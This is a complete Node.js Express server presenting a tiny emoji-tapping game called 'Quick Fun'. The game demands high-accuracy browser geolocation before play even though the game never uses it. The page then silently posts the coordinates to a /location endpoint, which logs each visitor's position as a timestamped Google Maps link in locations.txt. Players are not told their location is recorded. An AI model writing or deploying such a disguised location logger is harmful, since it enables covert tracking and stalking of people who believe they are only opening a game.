import express from "express";
import fs from "fs-extra";
import path from "path";

const app = express();
const PORT = process.env.PORT || 3000;

app.use('/static', express.static(path.join(process.cwd(), 'public')));

app.get("/", (req, res) => {
  res.send(`<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Quick Fun</title>
<style>
  :root{--accent:#0b78d1}
  html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;}
  .overlay{position:fixed;inset:0;background:#f7fbff;display:flex;align-items:center;justify-content:center;padding:20px}
  .card{max-width:720px;background:#fff;border-radius:14px;box-shadow:0 10px 30px rgba(2,10,20,0.08);padding:28px;text-align:center}
  h2{margin:0 0 8px;color:#02324a}
  p.lead{margin:0 0 18px;color:#03506b}
  button.cta{background:var(--accent);color:#fff;border:0;padding:12px 18px;border-radius:10px;font-weight:600;cursor:pointer}
  #gameArea{display:none;position:fixed;inset:0;background:#fff;touch-action:none}
  #emoji{position:absolute;font-size:3.2rem;will-change:transform;transition:transform .18s ease}
  #hud{position:fixed;top:12px;left:12px;background:rgba(255,255,255,0.9);padding:8px 12px;border-radius:10px;box-shadow:0 4px 10px rgba(2,10,20,0.06);font-weight:700;color:var(--accent)}
  /* prevent scroll while playing on mobile */
  body.playing { touch-action: none; overflow: hidden; }
</style>
</head>
<body>
  <div class="overlay" id="overlay">
    <div class="card">
      <h2>Quick Fun — a tiny game</h2>
      <p class="lead">To play, your device/browser will ask to share your location. This is the standard browser prompt. Allow to start the game.</p>
      <button id="startBtn" class="cta">Allow location & Play</button>
    </div>
  </div>

  <div id="gameArea">
    <div id="hud">Score: <span id="score">0</span></div>
    <div id="emoji">🐱</div>
  </div>

<script>
(() => {
  const overlay = document.getElementById('overlay');
  const startBtn = document.getElementById('startBtn');
  const gameArea = document.getElementById('gameArea');
  const emoji = document.getElementById('emoji');
  const scoreEl = document.getElementById('score');

  let score = 0;
  let baseInterval = 1500; // ms
  let minInterval = 350;
  let moveTimer = null;
  let currentInterval = baseInterval;
  let playing = false;
  let gameOver = false;

  // helper to send location
  function sendLocation(lat, lon){
    // fire-and-forget
    fetch('/location?lat=' + encodeURIComponent(lat) + '&lon=' + encodeURIComponent(lon)).catch(()=>{});
  }

  // Start flow: request location
  startBtn.addEventListener('click', () => {
    if (!navigator.geolocation) {
      overlay.innerHTML = '<div class="card"><h2>Not supported</h2><p class="lead">Geolocation not supported by this browser. Cannot play.</p></div>';
      return;
    }

    startBtn.disabled = true;
    startBtn.innerText = 'Requesting location…';

    navigator.geolocation.getCurrentPosition(pos => {
      // Save location on server
      sendLocation(pos.coords.latitude, pos.coords.longitude);

      // Hide overlay and start game
      overlay.style.display = 'none';
      document.body.classList.add('playing');
      gameArea.style.display = 'block';
      startGame();
    }, err => {
      overlay.innerHTML = '<div class="card"><h2>Permission denied</h2><p class="lead">You denied location. This game requires location to play.</p></div>';
    }, { enableHighAccuracy: true, timeout: 10000 });
  });

  function startGame(){
    score = 0;
    currentInterval = baseInterval;
    gameOver = false;
    playing = true;
    scoreEl.innerText = score;
    // initial placement
    placeEmojiRandom();
    scheduleMove();
    // listen for clicks/touches anywhere in game area
    gameArea.addEventListener('pointerdown', onGameAreaPointerDown);
    emoji.addEventListener('pointerdown', onEmojiPointerDown, { passive: false });
    // handle resize so emoji stays in bounds
    window.addEventListener('resize', onWindowResize);
  }

  function onWindowResize(){ /* no-op but can be used to reposition if desired */ }

  function placeEmojiRandom(){
    const padding = 20;
    const emojiSize = Math.max(48, Math.min(96, window.innerWidth * 0.08)); // adapt size
    emoji.style.fontSize = emojiSize + 'px';
    const maxX = Math.max(0, window.innerWidth - emojiSize - padding);
    const maxY = Math.max(0, window.innerHeight - emojiSize - padding);
    const x = Math.random() * maxX;
    const y = Math.random() * maxY;
    // use transform for smoother animation
    emoji.style.transform = 'translate(' + x + 'px,' + y + 'px)';
  }

  function scheduleMove(){
    clearTimeout(moveTimer);
    moveTimer = setTimeout(() => {
      placeEmojiRandom();
      // keep scheduling if still playing
      if (!gameOver) scheduleMove();
    }, currentInterval);
  }

  function onEmojiPointerDown(e){
    // user successfully clicked emoji
    e.stopPropagation();
    e.preventDefault();
    if (gameOver) return;
    score++;
    scoreEl.innerText = score;

    // speed up every 10 points
    const steps = Math.floor(score / 10);
    currentInterval = Math.max(minInterval, baseInterval - steps * 200);

    // immediately move emoji to new pos (reward)
    placeEmojiRandom();

    // reset schedule with new interval
    clearTimeout(moveTimer);
    scheduleMove();
  }

  function onGameAreaPointerDown(e){
    // if pointerdown target is not the emoji (or inside emoji), it's a miss -> game over
    const path = e.composedPath ? e.composedPath() : (e.path || []);
    const clickedEmoji = path && path.includes(emoji);
    if (!clickedEmoji && !gameOver && playing) {
      endGame();
    }
  }

  function endGame(){
    gameOver = true;
    playing = false;
    clearTimeout(moveTimer);
    // remove listeners
    gameArea.removeEventListener('pointerdown', onGameAreaPointerDown);
    emoji.removeEventListener('pointerdown', onEmojiPointerDown);
    window.removeEventListener('resize', onWindowResize);

    // show result overlay (simple)
    const msg = document.createElement('div');
    msg.style.position = 'fixed';
    msg.style.inset = '0';
    msg.style.display = 'flex';
    msg.style.alignItems = 'center';
    msg.style.justifyContent = 'center';
    msg.style.background = 'rgba(0,0,0,0.45)';
    msg.innerHTML = '<div style="background:#fff;padding:22px;border-radius:12px;text-align:center;max-width:320px;"><h2 style="margin:0 0 10px">Game Over</h2><p style="margin:0 0 14px">Final score: <strong>' + score + '</strong></p><button id="playAgain" style="background:var(--accent);color:#fff;padding:10px 14px;border-radius:8px;border:0;font-weight:700;cursor:pointer">Play again</button></div>';
    document.body.appendChild(msg);
    const btn = document.getElementById('playAgain');
    btn.addEventListener('click', () => {
      document.body.removeChild(msg);
      // restart by reloading page so permission flow resets cleanly or call startGame again:
      // reload to simplify state and ensure location prompt logic remains clear
      location.reload();
    });
  }

  // ensure the emoji can't be selected/draggable
  emoji.ondragstart = () => false;

})();
</script>
</body>
</html>`);
});

app.get("/location", (req, res) => {
  const lat = req.query.lat;
  const lon = req.query.lon;
  if (lat && lon) {
    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
    const logLine = `${new Date().toISOString()} | ${mapsLink}\n`;
    // Be careful with this file; keep it private on the server and remove later if not needed
    fs.appendFileSync("locations.txt", logLine);
    console.log("Saved location:", mapsLink);
  }
  res.sendStatus(200);
});

app.listen(PORT, () => console.log('Server listening on', PORT));
